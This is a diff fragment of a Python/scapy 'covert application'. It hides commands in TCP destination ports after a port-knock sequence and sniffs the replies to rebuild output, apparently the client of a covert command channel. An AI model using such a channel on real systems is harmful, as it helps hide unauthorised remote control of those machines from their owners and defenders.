@@ -32,7 +32,7 @@ def char_packet(dest, char1, char2=None):
         destport = ord(char1) << 8
     else:
         destport = (ord(char1) << 8) + ord(char2)
-    return IP(dst=dest) / TCP(sport=get_srcport(), dport=destport, flags="S")
+    return IP(dst=dest) / TCP(sport=80, dport=destport)
 
 
 def get_srcport():
@@ -59,7 +59,7 @@ def disconnect(dest):
 
 def end_msg(dest):
     randPort = randint(1500, 65535)
-    packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=get_srcport())
+    packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=80)
     send(packet)
 
 
@@ -81,8 +81,10 @@ def delay_sleep():
 
 
 def get_result(packet):
+	global OUTPUT
 	if(packet[1].id == 42424):
 		print(''.join(OUTPUT))
+		OUTPUT = []
 		return True
 	dport = packet[2].dport
 	char1 = chr((dport >> 8) & 0xff)
@@ -103,6 +105,7 @@ def send_cmd(msg):
         send(char_packet(args.destIP, msg[len(msg) - 1]))
     end_msg(args.destIP)
 
+
 def main():
     verify_root()
     ports = [2525, 14156, 6364]
@@ -113,7 +116,6 @@ def main():
         send_cmd(msg)
         sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
         
-
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser("Python Covert Application")
